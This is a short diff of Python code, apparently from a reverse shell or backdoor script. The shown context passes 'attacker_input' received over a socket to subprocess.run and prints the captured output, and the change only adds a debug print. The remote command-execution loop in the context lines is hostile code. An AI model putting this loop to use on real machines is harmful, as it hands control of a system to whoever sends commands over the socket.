@@ -34,6 +34,7 @@ try:
                 s.send(b'\n')
         elif len(attacker_input) > 0:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
+            print(f"finished subprocess.run")
             result = result.stdout.decode()
             print(f"result: {result}")
             print(f"type(result): {type(result)}")
